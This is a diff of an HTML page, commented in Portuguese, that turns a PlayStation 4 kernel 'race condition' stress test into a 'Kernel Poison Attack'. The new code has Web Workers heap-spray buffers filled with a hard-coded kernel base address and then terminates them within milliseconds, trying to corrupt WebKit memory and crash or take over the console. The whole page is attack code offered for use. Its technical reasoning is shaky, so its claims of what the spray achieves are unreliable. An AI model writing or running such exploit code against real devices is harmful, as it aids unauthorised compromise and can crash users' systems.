@@ -2,122 +2,112 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>IsoTest 06: Kernel Scheduler UAF</title>
+<title>PS4 Kernel Pointer Poisoning</title>
 <style>
-    body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
-    button { padding: 15px; background: #333; color: #fff; border: 1px solid #0f0; cursor: pointer; font-size: 16px; margin-bottom: 10px; width: 100%; }
-    #log { border: 1px solid #444; height: 400px; overflow-y: scroll; padding: 10px; background: #000; }
-    .highlight { color: #ff3333; font-weight: bold; }
+    body { background: #000; color: #ff3333; font-family: monospace; padding: 20px; }
+    button { width: 100%; padding: 20px; background: #222; border: 2px solid #f00; color: #fff; font-weight: bold; font-size: 18px; cursor: pointer; }
+    #log { margin-top: 20px; border: 1px solid #333; height: 300px; overflow: auto; white-space: pre-wrap; }
 </style>
 </head>
 <body>
 
-<h1>TARGET: KERNEL SCHEDULER (ISOLATED)</h1>
-<p>Testando Cenário B: Race Condition durante Thread Teardown</p>
+<h1>KERNEL POISON ATTACK</h1>
+<p>Target: 0xffffffff82200000 (Kernel Base)</p>
+<p>Strategy: UAF + Heap Spray com Ponteiro de Kernel</p>
 <hr>
 
-<button onclick="startRace()">INICIAR RACE CONDITION (PODE DESLIGAR O CONSOLE)</button>
-<button onclick="stopRace()">PARAR TESTE</button>
+<button onclick="startPoisoning()">INJETAR PONTEIROS MALICIOSOS (RACE)</button>
 
-<div id="log">Aguardando início...</div>
+<div id="log">Sistema pronto.</div>
 
 <script>
-    let running = false;
-    let round = 0;
-    
-    // Logger visual
-    function log(msg, type='') {
-        const el = document.getElementById('log');
-        const line = document.createElement('div');
-        line.innerText = `[R${round}] ${msg}`;
-        if(type === 'err') line.className = 'highlight';
-        el.appendChild(line);
-        el.scrollTop = el.scrollHeight;
+    function log(msg) {
+        document.getElementById('log').innerText += `\n[+] ${msg}`;
     }
 
-    // Payload do Worker:
-    // Ele tenta alocar memória e mantê-la ocupada, forçando o Kernel a trabalhar
-    // durante o processo de encerramento.
-    const workerScript = `
+    // Endereço do Kernel fornecido por você
+    // 0xffffffff82200000 em Little Endian (padrão x86_64/PS4)
+    // Low: 0x82200000, High: 0xffffffff
+    const KERNEL_POINTER_LOW = 0x82200000;
+    const KERNEL_POINTER_HIGH = 0xffffffff;
+
+    const workerCode = `
         onmessage = function(e) {
-            // Cria pressão na heap
-            const junk = new Array(5000).fill(1.1);
-            // Tenta responder (mantém canal IPC aberto)
-            postMessage('alive');
-        };
-    `;
-    const blob = new Blob([workerScript], {type: 'application/javascript'});
-    const workerUrl = URL.createObjectURL(blob);
-
-    // Função para tentar sobrescrever memória liberada (Heap Spray simples)
-    function trySpray() {
-        const spray = [];
-        for(let i=0; i<100; i++) {
-            // Tenta alocar objetos de tamanho similar a estruturas de thread (chute educado)
-            spray.push(new ArrayBuffer(1024 * 4)); 
-        }
-        return spray;
-    }
-
-    async function raceStep() {
-        if(!running) return;
-        round++;
-
-        const workers = [];
-        const buffers = [];
-
-        // 1. Fase de Alocação Rápida (Spawn)
-        // Cria apenas 20 threads para não estourar a RAM, mas estressar o Scheduler
-        try {
-            for(let i=0; i<25; i++) {
-                const w = new Worker(workerUrl);
-                workers.push(w);
+            const cmd = e.data;
+            
+            if(cmd.type === 'spray') {
+                // Cria um array de Buffers preenchidos com o endereço do Kernel
+                // Isso cria "minas terrestres" na memória RAM
+                const spray = [];
+                for(let i=0; i < 200; i++) {
+                    // 4KB por bloco
+                    const buf = new Uint32Array(1024); 
+                    for(let j=0; j < buf.length; j+=2) {
+                        buf[j] = ${KERNEL_POINTER_LOW};   // Parte baixa
+                        buf[j+1] = ${KERNEL_POINTER_HIGH}; // Parte alta
+                    }
+                    spray.push(buf);
+                }
                 
-                // Envia uma mensagem para garantir que a thread iniciou e está processando
-                // Usamos Transferable (ArrayBuffer) para complexidade de memória
-                const buf = new ArrayBuffer(1024);
-                buffers.push(buf); // Guarda ref
-                w.postMessage(buf, [buf]);
+                // Mantém ocupado para aumentar a janela de corrida
+                postMessage('sprayed');
             }
-        } catch(e) {
-            log("Erro na criação: " + e.message, 'err');
+        }
+    `;
+
+    const blobUrl = URL.createObjectURL(new Blob([workerCode], {type: 'application/javascript'}));
+
+    function startPoisoning() {
+        log("Iniciando injeção de endereços de Kernel...");
+        
+        let workers = [];
+        let running = true;
+
+        // Loop de Race Condition
+        function race() {
+            if(!running) return;
+
+            // 1. Cria Workers (Aloca memória)
+            const w = new Worker(blobUrl);
+            workers.push(w);
+
+            // 2. Manda eles encherem a memória com o endereço do Kernel
+            w.postMessage({type: 'spray'});
+
+            // 3. O Pulo do Gato: Terminate vs Message
+            // Tentamos fechar o worker EXATAMENTE enquanto ele está escrevendo na memória.
+            // Se o WebKit limpar a estrutura do worker mas o processo de escrita continuar
+            // por milissegundos, ele pode corromper uma vtable vizinha com o endereço do Kernel.
+            setTimeout(() => {
+                w.terminate();
+                
+                // Tenta limpar referências para forçar Garbage Collection imediato
+                workers.shift(); 
+                
+                // Spray na thread principal também para garantir saturação
+                fillMainThreadHeap();
+            }, 5); // Janela de tempo ajustada
+
+            requestAnimationFrame(race);
         }
 
-        // Pequeno delay para garantir que as threads estão "Running" no Kernel
-        // O crash acontece se matarmos enquanto ela muda de estado (Running -> Terminated)
-        await new Promise(r => setTimeout(r, 5));
-
-        // 2. Fase de Destruição e Reutilização (Race)
-        // Matamos todos e IMEDIATAMENTE tentamos alocar memória por cima
-        try {
-            for(let w of workers) {
-                w.terminate(); 
-            }
-            
-            // SPRAY IMEDIATO: Se o Kernel liberou a struct da thread mas ainda 
-            // tem um ponteiro para ela, tentamos colocar nossos dados lá.
-            trySpray(); 
-            
-            log(`Ciclo ${round}: 25 Threads terminadas + Spray executado.`);
-        } catch(e) {
-            log("Erro na destruição: " + e.message, 'err');
+        // Função auxiliar para sujar a memória da thread principal
+        function fillMainThreadHeap() {
+            try {
+                const arr = new Uint32Array(1000);
+                for(let i=0; i<arr.length; i+=2) {
+                    arr[i] = KERNEL_POINTER_LOW;
+                    arr[i+1] = KERNEL_POINTER_HIGH;
+                }
+            } catch(e) {}
         }
 
-        // Loop agressivo
-        if(running) requestAnimationFrame(raceStep);
-    }
-
-    function startRace() {
-        if(running) return;
-        running = true;
-        log("Iniciando Race Condition no Scheduler...");
-        log("AVISO: Se bem sucedido, o sistema irá travar (Panic).");
-        raceStep();
-    }
-
-    function stopRace() {
-        running = false;
-        log("Teste interrompido pelo usuário.");
+        // Inicia 4 threads concorrentes de ataque
+        for(let i=0; i<4; i++) race();
+        
+        setTimeout(() => {
+            log("Ataque em andamento... Se o console não desligar em 30s, recarregue.");
+        }, 1000);
     }
 </script>
 
